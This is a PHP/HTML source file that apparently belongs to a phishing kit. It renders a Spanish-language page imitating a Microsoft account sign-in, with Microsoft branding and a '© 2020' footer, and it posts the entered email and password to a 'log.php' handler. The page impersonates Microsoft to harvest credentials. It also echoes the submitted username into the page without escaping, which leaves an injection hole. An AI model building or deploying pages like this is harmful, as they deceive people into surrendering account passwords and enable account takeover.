﻿﻿<html>
<head>
<title>Registrarse</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="images/hfavicon.ico" rel="shortcut icon">
</head>
<body >
	<div id="container">
		<div class="logo">
			<img src="images/hlogo.png">
			<div class="header-wrapper">
				<h2 class="header-text">Registrarse</h2>
				<span>Utilice su cuenta de Microsoft.<br /><a href="#">¿Qué es esto?</a></span>
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>

						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="Correo electrónico, teléfono o skype" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Contraseña" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Manténme conectado</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Registrarse" class="default">
					</div>
					<div class="input-fields forgot">
						<p>¿No tienen en cuenta? <a href="#">¡Crea uno!</a></p>
					
						<p><a href="#">Olvidé mi contraseña</a></p>
						<p><a href="#">Inicia sesión con un código de un solo uso</a></p>
					
						<p class="brand">Microsoft © 2020</p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>